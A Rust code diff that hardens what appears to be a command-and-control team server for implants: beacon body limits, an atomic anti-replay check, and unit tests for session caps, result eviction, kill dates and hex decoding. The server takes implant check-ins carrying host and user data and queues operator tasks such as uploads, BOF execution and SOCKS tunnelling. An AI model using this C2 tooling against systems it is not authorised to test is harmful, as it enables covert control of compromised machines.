@@ -24,6 +24,14 @@ pub const MAX_RESULTS_PER_SESSION: usize = 4096;
 /// speaks the protocol registers a session), so without a cap an attacker can
 /// flood the registry with distinct ephemeral keys → OOM.
 pub const MAX_SESSIONS: usize = 4096;
+/// Per-request body cap on the beacon endpoint (and any profile-declared beacon
+/// URIs). A beacon body is exactly ONE encrypted frame — `[32 pubkey][8 counter]
+/// [4 ct_len][ct ≤ 256 KiB (the protocol's MAX_CT_LEN)][16 tag]` — so the real
+/// ceiling is ~256 KiB + header. 512 KiB is generous while staying ~8× under the
+/// 4 MiB cap on the operator API routes, so an unauthenticated flood against
+/// `/beacon` (check-in is crypto-gated, not token-gated, by design) can't buffer
+/// the full API allowance per hit.
+pub const BEACON_BODY_LIMIT: usize = 512 * 1024;
 
 use axum::{
     body::Bytes,
@@ -260,32 +268,40 @@ pub fn router(state: Arc<AppState>) -> Router {
         })
         .unwrap_or_default();
 
-    let mut r = Router::new()
-        .route("/beacon", post(beacon))
-        .route("/api/sessions", get(list_sessions))
-        .route("/api/task", post(post_task))
-        .route("/api/tasks", get(get_tasks))
-        .route("/api/results", get(get_results))
-        .route("/api/profile", get(get_profile));
+    // Beacon routes (unauthenticated, crypto-gated). A beacon POST carries
+    // exactly ONE encrypted frame (≤ ~256 KiB: MAX_CT_LEN + header + tag), so
+    // BEACON_BODY_LIMIT (512 KiB) is generous. Keeping it well under the API
+    // limit bounds the pre-auth buffering an attacker can trigger per /beacon
+    // connection (check-in is crypto-gated, not token-gated, by design).
+    let mut beacon_routes = Router::new().route("/beacon", post(beacon));
     let mut seen = std::collections::HashSet::new();
     for (uri, is_post) in extra {
         if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
             continue;
         }
-        r = if is_post {
-            r.route(&uri, post(beacon))
+        beacon_routes = if is_post {
+            beacon_routes.route(&uri, post(beacon))
         } else {
-            r.route(&uri, get(beacon))
+            beacon_routes.route(&uri, get(beacon))
         };
     }
-    // Hard cap on request body size, applied router-wide so it covers BOTH the
-    // axum::serve path (which has its own 2 MiB default for extractors) AND the
-    // raw-TLS `serve_connection` path in main.rs (which has NO default limit).
-    // 4 MiB allows chunked screenshot/file responses while still blocking the
-    // multi-GB-buffering OOM vector. Each encrypted frame is capped at 256 KiB
-    // (MAX_CT_LEN), but a single beacon check-in POST can carry multiple frames
-    // (e.g. a 1 MB screenshot split into 128 KiB FileChunks).
-    r.layer(DefaultBodyLimit::max(4 * 1024 * 1024)).with_state(state)
+    let beacon_routes = beacon_routes.route_layer(DefaultBodyLimit::max(BEACON_BODY_LIMIT));
+
+    // Control-API routes (operator; token-gated when NYX_TOKEN is set). A larger
+    // cap so hex-encoded Upload/Bof payloads fit (a 2 MB file → ~4 MB of hex in
+    // the JSON body). This layer covers BOTH serving paths — `axum::serve`
+    // (plaintext) and the raw-TLS `serve_connection` in main.rs (no built-in
+    // limit) — because the layer is baked into the Router's service whichever
+    // driver consumes it.
+    let api_routes = Router::new()
+        .route("/api/sessions", get(list_sessions))
+        .route("/api/task", post(post_task))
+        .route("/api/tasks", get(get_tasks))
+        .route("/api/results", get(get_results))
+        .route("/api/profile", get(get_profile))
+        .layer(DefaultBodyLimit::max(4 * 1024 * 1024));
+
+    beacon_routes.merge(api_routes).with_state(state)
 }
 
 // ---- implant endpoint ------------------------------------------------------
@@ -432,17 +448,18 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
     }
     let raw = parse_frame(body)?;
 
-    // Decide new-vs-existing and (for existing) run the anti-replay check +
-    // derive the key, all without holding a `.expect()`-prone TOCTOU window.
-    // The server runs under `panic = "abort"`, so any panic here kills the whole
-    // team server — we must never panic on a missing/raced session entry.
+    // Decide new-vs-existing and (for existing) grab the session key. This
+    // read-guard counter check is ADVISORY only: it lets us skip the decrypt
+    // for an obvious stale replay, but it is NOT the authoritative anti-replay
+    // decision — that lives inside the write guard below (existing-session
+    // branch), where the check and the `last_recv` commit are atomic. Without
+    // that, two concurrent beacons carrying the same counter could both pass
+    // this read-guard check before either commits, defeating replay protection.
+    // (The server runs under `panic = "abort"`, so we must never panic on a
+    // missing/raced session entry — hence the clean error paths, no `.expect()`.)
     let (is_new, key) = match st.sessions.get(&raw.pubkey) {
         None => (true, st.keypair.derive_for(&raw.pubkey)),
         Some(s) => {
-            // Anti-replay: reject non-monotonic counters. (The actual last_recv
-            // update happens below under a single get_mut guard so the check
-            // and the write can't be split by a concurrent beacon for the same
-            // session.)
             if raw.counter <= s.last_recv {
                 anyhow::bail!("replayed/stale counter {}", raw.counter);
             }
@@ -505,31 +522,43 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
         ))
     } else {
         // Subsequent messages carry task responses; we reply with queued tasks.
-        let responses = TaskResponse::decode_vec(&plaintext)?;
-        // Fire a ResultReceived scripting event per response (read-only pass
-        // over `responses` before they're moved into the session below).
-        let session_id = hex::encode(raw.pubkey);
-        for r in &responses {
-            let (kind, summary) = response_event_kind(&r.response);
-            st.events.fire(&nyx_scripting::Event::ResultReceived(
-                nyx_scripting::ResultReceived {
-                    session_id: session_id.clone(),
-                    task_id: r.task_id,
-                    kind,
-                    summary,
-                },
-            ));
-        }
-        // Hold a single write guard for the anti-replay commit + result ingest
-        // + task drain, so a concurrent beacon for the same session can't split
-        // the check from the write (TOCTOU) or race the pending-tasks drain.
-        // If the session vanished between the get() above and here (e.g. an
-        // operator eviction added later), return a clean error — never panic.
+        //
+        // AUTHORITATIVE anti-replay check — INSIDE the write guard. The advisory
+        // read-guard check above only saves a decrypt on an obvious stale frame;
+        // THIS is where replay protection is actually enforced, because the
+        // `counter <= last_recv` test and the `last_recv = counter` commit run
+        // under one `get_mut` guard and so cannot be split by a concurrent beacon
+        // for the same session. A racing replay that also passed the advisory
+        // check loses here: whichever request takes the write guard first
+        // advances `last_recv`; the other then sees `counter <= last_recv` and is
+        // rejected. (If the session vanished between the get() above and here,
+        // return a clean error — never panic.)
         let mut s = st
             .sessions
             .get_mut(&raw.pubkey)
             .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
+        if raw.counter <= s.last_recv {
+            anyhow::bail!("replayed/stale counter {}", raw.counter);
+        }
         s.last_recv = raw.counter;
+        let responses = TaskResponse::decode_vec(&plaintext)?;
+        // Snapshot the scripting-event payloads now (we're about to move
+        // `responses` into s.results), then fire them AFTER dropping the guard
+        // so a slow operator script (NYX_SCRIPT) can't block this session's
+        // DashMap shard.
+        let session_id = hex::encode(raw.pubkey);
+        let fired: Vec<nyx_scripting::Event> = responses
+            .iter()
+            .map(|r| {
+                let (kind, summary) = response_event_kind(&r.response);
+                nyx_scripting::Event::ResultReceived(nyx_scripting::ResultReceived {
+                    session_id: session_id.clone(),
+                    task_id: r.task_id,
+                    kind,
+                    summary,
+                })
+            })
+            .collect();
         for r in responses {
             s.results.push(r);
             // Bound the results buffer: a rogue/compromised implant streaming
@@ -545,6 +574,9 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
         s.send_counter += 1;
         let counter = s.send_counter;
         drop(s);
+        for ev in fired {
+            st.events.fire(&ev);
+        }
         let reply = Task::encode_vec(&tasks);
         Ok(encode_frame_dir(
             &raw.pubkey,
@@ -1187,5 +1219,251 @@ mod tests {
         .into_command()
         .unwrap();
         assert!(matches!(cmd, Command::Socks { chan: 5, op: 1, .. }));
+    }
+
+    // ---- Anti-replay (authoritative write-guard check) ---------------------
+    //
+    // These two tests pin the security fix that moved the replay decision INTO
+    // the write guard (`sessions.get_mut`), closing the TOCTOU where two
+    // concurrent beacons carrying the same counter could both pass the advisory
+    // read-guard check and split the check from the commit. The server runs
+    // under `panic = "abort"`, so these also guard against regressions that
+    // would panic on a raced/missing session entry.
+
+    /// Build a sealed check-in frame (SessionInfo) for `counter` carrying
+    /// `pubkey`, keyed under the server in `st`. Mirrors what a dev implant
+    /// sends on first contact. Returns the derived session key + the frame.
+    fn checkin_frame(st: &AppState, pubkey: &[u8; 32], counter: u64) -> (SessionKey, Vec<u8>) {
+        let key = st.keypair.derive_for(pubkey);
+        let info = SessionInfo {
+            beacon_id: 0x1337,
+            hostname: "test-host".into(),
+            username: "test-user".into(),
+            os: "linux".into(),
+            arch: 1,
+            pid: 42,
+            is_admin: 0,
+        };
+        let mut w = nyx_protocol::wire::Writer::new();
+        info.encode(&mut w);
+        let plaintext = w.into_bytes();
+        let frame = encode_frame_dir(pubkey, Direction::ClientToServer, counter, &key, &plaintext);
+        (key, frame)
+    }
+
+    /// Build a sealed "subsequent" frame (an empty TaskResponse batch) for an
+    /// existing session — the shape every post-check-in beacon carries.
+    fn response_frame(pubkey: &[u8; 32], key: &SessionKey, counter: u64) -> Vec<u8> {
+        let plaintext = TaskResponse::encode_vec(&[]);
+        encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, &plaintext)
+    }
+
+    #[test]
+    fn anti_replay_stale_counter_is_rejected() {
+        // A replayed/old counter must be rejected by the AUTHORITATIVE write-guard
+        // check — the advisory read-guard check is only an optimization that
+        // skips a decrypt for an obvious stale frame.
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &checkin).expect("first check-in must register the session");
+        // A legitimate advance to counter 2 succeeds.
+        let frame2 = response_frame(&pubkey, &key, 2);
+        handle_beacon(&st, &peer, &frame2).expect("counter 2 must advance");
+        // Replaying counter 2 (stale: counter <= last_recv) must be rejected.
+        let err = handle_beacon(&st, &peer, &frame2)
+            .expect_err("a stale counter must be rejected, not accepted");
+        assert!(
+            err.to_string().contains("replayed/stale counter"),
+            "expected a replay rejection, got: {err}"
+        );
+    }
+
+    #[test]
+    fn anti_replay_concurrent_same_counter_only_one_wins() {
+        // Two beacons carrying the SAME counter, fired concurrently against one
+        // session: the authoritative check inside the write guard must let
+        // exactly ONE through and reject the other. Before the fix both could
+        // pass the advisory read-guard check before either committed last_recv.
+        let st = std::sync::Arc::new(AppState::default());
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:9998".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &checkin).expect("check-in must register the session");
+
+        // Race N times on monotonically-increasing counters. A single iteration
+        // could accidentally serialize on a loaded CI box; N iterations make a
+        // scheduling fluke that lets both through astronomically unlikely and
+        // pin the authoritative-check guarantee across runs. (Each iteration
+        // races a FRESH higher counter so the prior commit doesn't make both
+        // threads see a stale replay.)
+        for i in 0..50u64 {
+            let counter = 2 + i;
+            let frame = response_frame(&pubkey, &key, counter);
+            let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
+            let mut handles = Vec::new();
+            for _ in 0..2 {
+                let st = st.clone();
+                let frame = frame.clone();
+                let barrier = barrier.clone();
+                handles.push(std::thread::spawn(move || {
+                    barrier.wait();
+                    handle_beacon(&st, &peer, &frame).is_ok()
+                }));
+            }
+            let results: Vec<bool> = handles.into_iter().map(|h| h.join().unwrap()).collect();
+            let oks = results.iter().filter(|&&ok| ok).count();
+            assert_eq!(
+                oks, 1,
+                "iter {i}: exactly one concurrent same-counter beacon must succeed, got {results:?}"
+            );
+        }
+    }
+
+    // ---- DoS / safety-guard coverage ---------------------------------------
+    //
+    // These pin the server's memory/existence guards that previously had ZERO
+    // test coverage (flagged by the adversarial review): the session-registry
+    // cap, the per-session results eviction, the kill-date burn switch, and the
+    // hex-decode rejection paths in JsonCommand. All are guards a regression
+    // would silently weaken, so each gets a deterministic test.
+
+    /// Minimal valid `Session` for filling the registry without per-entry crypto.
+    fn dummy_session() -> Session {
+        Session {
+            key: [0u8; 32],
+            info: SessionInfo {
+                beacon_id: 0,
+                hostname: String::new(),
+                username: String::new(),
+                os: String::new(),
+                arch: 0,
+                pid: 0,
+                is_admin: 0,
+            },
+            last_recv: 0,
+            send_counter: 0,
+            next_task_id: 1,
+            pending: Vec::new(),
+            results: Vec::new(),
+            created: Instant::now(),
+            ja3: None,
+            ja4: None,
+        }
+    }
+
+    #[test]
+    fn max_sessions_cap_rejects_checkin_beyond_limit() {
+        // Beacon check-in is unauthenticated (anyone who speaks the protocol
+        // registers), so the registry cap is the only thing stopping a distinct-
+        // key flood from OOMing the server. Fill it to the cap with dummy
+        // sessions, then assert a fresh check-in is refused.
+        let st = AppState::default();
+        for i in 0..MAX_SESSIONS as u32 {
+            let mut pk = [0u8; 32];
+            pk[0..4].copy_from_slice(&i.to_le_bytes());
+            st.sessions.insert(pk, dummy_session());
+        }
+        assert_eq!(st.sessions.len(), MAX_SESSIONS);
+
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7777".parse().unwrap();
+        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
+        let err = handle_beacon(&st, &peer, &checkin)
+            .expect_err("a check-in past the session cap must be rejected");
+        assert!(
+            err.to_string().contains("session registry full"),
+            "expected a registry-full rejection, got: {err}"
+        );
+    }
+
+    #[test]
+    fn results_buffer_evicts_oldest_past_cap() {
+        // A rogue/compromised implant streaming Output/FileChunk blobs could
+        // fill RAM forever; the per-session results buffer evicts the oldest
+        // entries past MAX_RESULTS_PER_SESSION. Drive it in ONE beacon carrying
+        // cap+100 responses (one crypto op, exercises the in-loop drain).
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7776".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &checkin).expect("check-in");
+
+        let overflow = 100;
+        let batch: Vec<TaskResponse> = (0..(MAX_RESULTS_PER_SESSION as u64 + overflow))
+            .map(|i| TaskResponse {
+                task_id: i,
+                response: MsgResponse::Ok,
+            })
+            .collect();
+        let plaintext = TaskResponse::encode_vec(&batch);
+        let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, 2, &key, &plaintext);
+        handle_beacon(&st, &peer, &frame).expect("ingest of oversized result batch");
+
+        let s = st.sessions.get(&pubkey).expect("session present");
+        assert_eq!(
+            s.results.len(),
+            MAX_RESULTS_PER_SESSION,
+            "results must be capped, not grown unbounded"
+        );
+        // Oldest `overflow` entries are evicted; first survivor is task `overflow`.
+        assert_eq!(
+            s.results.first().unwrap().task_id,
+            overflow,
+            "oldest surviving result must be task {overflow}, not task 0"
+        );
+        assert!(
+            s.results.iter().all(|r| r.task_id >= overflow),
+            "no evicted task id should remain"
+        );
+    }
+
+    #[test]
+    fn killdate_past_refuses_beacons_and_future_allows() {
+        // The kill-date is the operator's "burn the server" switch: once wall
+        // time passes it, the server stops serving beacons entirely. Checked at
+        // the top of handle_beacon, before parse_frame, so it refuses regardless
+        // of the body. Past → refuse; far-future → proceed.
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7775".parse().unwrap();
+
+        let mut st = AppState::default();
+        st.killdate = Some(1); // 1970-01-01 — always in the past.
+        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
+        let err = handle_beacon(&st, &peer, &checkin)
+            .expect_err("a past kill-date must refuse beacons");
+        assert!(
+            err.to_string().contains("kill date"),
+            "expected a kill-date refusal, got: {err}"
+        );
+
+        // Far-future kill-date: the check-in proceeds normally.
+        let mut st2 = AppState::default();
+        st2.killdate = Some(u64::MAX);
+        let (_key, checkin2) = checkin_frame(&st2, &pubkey, 1);
+        handle_beacon(&st2, &peer, &checkin2).expect("a future kill-date must allow check-in");
+    }
+
+    #[test]
+    fn bad_data_hex_is_rejected_not_crashed() {
+        // JsonCommand paths that decode hex (Upload, Bof) must return a clean
+        // error on non-hex input, not panic. The server runs under
+        // `panic = "abort"`, so a panic here would kill the whole team server.
+        let bad_upload =
+            JsonCommand::Upload { name: "x".into(), data_hex: "zz".into() }.into_command();
+        assert!(bad_upload.is_err(), "non-hex Upload data_hex must error");
+
+        let good_upload =
+            JsonCommand::Upload { name: "x".into(), data_hex: "00ff".into() }.into_command();
+        assert!(good_upload.is_ok(), "valid hex Upload data_hex must decode");
+
+        let bad_bof = JsonCommand::Bof {
+            name: "x".into(),
+            args: Vec::new(),
+            data_hex: "nothex".into(),
+        }
+        .into_command();
+        assert!(bad_bof.is_err(), "non-hex Bof data_hex must error");
     }
 }
